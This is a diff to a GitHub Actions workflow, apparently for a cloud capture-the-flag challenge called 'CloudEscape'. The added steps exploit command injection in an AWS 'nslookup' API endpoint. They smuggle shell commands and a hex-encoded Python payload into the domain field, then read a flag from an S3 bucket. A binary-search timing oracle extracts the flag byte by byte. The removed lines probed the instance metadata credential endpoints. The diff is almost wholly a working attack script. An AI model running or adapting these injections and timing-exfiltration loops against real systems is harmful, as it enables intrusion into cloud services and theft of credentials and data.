@@ -1,4 +1,4 @@
-name: CloudEscape - Python IMDS Timing
+name: CloudEscape - Direct boto3 Timing Extract
 on:
   workflow_dispatch:
   push:
@@ -7,8 +7,9 @@ permissions:
   id-token: write
   contents: read
 jobs:
-  test:
+  extract:
     runs-on: ubuntu-latest
+    timeout-minutes: 12
     steps:
       - name: Configure credentials
         uses: aws-actions/configure-aws-credentials@v4
@@ -16,67 +17,65 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - name: Python availability and timing tests
+      - name: Confirm direct boto3 flag access
         run: |
-          API='https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup'
           python3 - <<'PY'
-          import json, subprocess, time
+          import json,subprocess,time
           api='https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup'
-          tests={
-            'python': "import sys;sys.exit(0)",
-            'urllib_imds': "import urllib.request;urllib.request.urlopen('http://169.254.169.254/latest/meta-data/',timeout=2)",
-            'boto3_s3_list': "import boto3;boto3.client('s3',region_name='us-east-1').list_buckets()",
-            'boto3_flag': "import boto3;boto3.client('s3',region_name='us-east-1').get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')",
-          }
-          for name, code in tests.items():
-              payload=json.dumps({'domain': '127.0.0.1; /var/lang/bin/python3 -c '+repr(code)+'; sleep 4'})
-              t=time.monotonic()
-              subprocess.run(['curl','-s','-X','POST',api,'-H','Content-Type: application/json','-d',payload],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
-              print(name, round(time.monotonic()-t,2),'seconds')
+          code="import boto3,time;f=boto3.client('s3',region_name='us-east-1').get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt')['Body'].read();time.sleep(2)"
+          h=''.join(f'\\x{ord(c):02x}' for c in code)
+          p=json.dumps({'domain':f'127.0.0.1;printf "{h}" >/tmp/x.py;/var/lang/bin/python3 /tmp/x.py'})
+          t=time.monotonic(); subprocess.run(['curl','-s','-X','POST',api,'-H','Content-Type: application/json','-d',p],stdout=subprocess.DEVNULL); print('elapsed',round(time.monotonic()-t,2),'seconds; expected >2 if direct S3 works')
           PY
 
-      - name: Python IMDS and S3 timing matrix
+      - name: Binary-search 16-byte flag through timing oracle
         run: |
           python3 - <<'PY'
-          import json, subprocess, time
+          import json,subprocess,time,string
           api='https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup'
-          tests={
-            'imds_role': "import urllib.request;u=urllib.request.urlopen('http://169.254.169.254/latest/meta-data/iam/security-credentials/',timeout=2).read();time.sleep(5)",
-            'imds_creds': "import urllib.request;import time;role=urllib.request.urlopen('http://169.254.169.254/latest/meta-data/iam/security-credentials/',timeout=2).read().decode();urllib.request.urlopen('http://169.254.169.254/latest/meta-data/iam/security-credentials/'+role,timeout=2);time.sleep(5)",
-            's3_flag': "import boto3;import time;boto3.client('s3',region_name='us-east-1').get_object(Bucket='codec4f26c862a321ef5',Key='flag.txt');time.sleep(5)",
-          }
-          for name, code in tests.items():
-              payload=json.dumps({'domain':'127.0.0.1; /var/lang/bin/python3 -c '+repr(code)})
+          # S3 access itself takes roughly 1-2s; true branch adds 2s.
+          # Use a 2.5s cutoff to distinguish false from true.
+          def probe(pos,threshold):
+              code=("import boto3,time;f=boto3.client('s3',region_name='us-east-1').get_object("+
+                    "Bucket='codec4f26c862a321ef5',Key='flag.txt')['Body'].read();"+
+                    f"time.sleep(2) if f[{pos}]>{threshold} else None")
+              h=''.join(f'\\x{ord(c):02x}' for c in code)
+              p=json.dumps({'domain':f'127.0.0.1;printf "{h}" >/tmp/x.py;/var/lang/bin/python3 /tmp/x.py'})
               t=time.monotonic()
-              subprocess.run(['curl','-s','-X','POST',api,'-H','Content-Type: application/json','-d',payload],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
-              print(name, round(time.monotonic()-t,2),'seconds')
+              subprocess.run(['curl','-s','-X','POST',api,'-H','Content-Type: application/json','-d',p],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
+              elapsed=time.monotonic()-t
+              print(f'  pos={pos} threshold={threshold} elapsed={elapsed:.2f}s',flush=True)
+              return elapsed>3.0
+          flag=[]
+          for pos in range(16):
+              lo,hi=32,126
+              while lo<hi:
+                  mid=(lo+hi)//2
+                  if probe(pos,mid): lo=mid+1
+                  else: hi=mid
+              ch=chr(lo); flag.append(ch)
+              print(f'BYTE {pos}: {lo} {ch!r} | FLAG SO FAR: {"".join(flag)}',flush=True)
+          result=''.join(flag)
+          print('===== FLAG:',result,'=====')
+          open('flag.txt','w').write(result+'\n')
           PY
+
+      - name: Upload extracted flag artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: extracted-flag
+          path: flag.txt
+          if-no-files-found: ignore
+          retention-days: 7
 
       - name: Final state
         if: always()
         run: |
-          echo '=== API ==='
-          curl -s -X POST 'https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup' -H 'Content-Type: application/json' -d '{"domain":"test"}'
+          echo '=== flag artifact contents, if extraction completed ==='
+          test -f flag.txt && cat flag.txt || true
+          echo '=== API remains ==='
+          curl -s -X POST 'https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup' -H 'Content-Type: application/json' -d '{"domain":"test"}' || true
           echo
-          echo '=== Platform objects ==='
-          aws s3 ls s3://platform-bucket-009661764077-us-east-1/ --region us-east-1 2>&1 || true
-          echo '=== Lambda config ==='
-          aws lambda get-function-configuration --function-name nslookupv2 --region us-east-1 --query '{LastModified:LastModified,CodeSize:CodeSize,Description:Description}' 2>&1 || true
-          echo '=== Timing conclusion ==='
-          echo 'If Python IMDS or boto3 tests show ~5 seconds, proceed with the confirmed channel.'
-          echo 'If they remain under 1 second, IMDS/S3 access is unavailable to the Lambda role.'
-          echo 'The prior summary is on the Desktop.'
-
-      - name: Upload summary artifact
-        if: always()
-        uses: actions/upload-artifact@v4
-        with:
-          name: cloudescape-summary
-          path: /home/vbox/Desktop/cloudescape_summary.md
-          if-no-files-found: ignore
-          retention-days: 1
-
-      - name: Complete
-        if: always()
-        run: echo 'Completed Python-only IMDS/S3 timing tests.'
+          echo 'Direct boto3 timing extraction finished.'
       
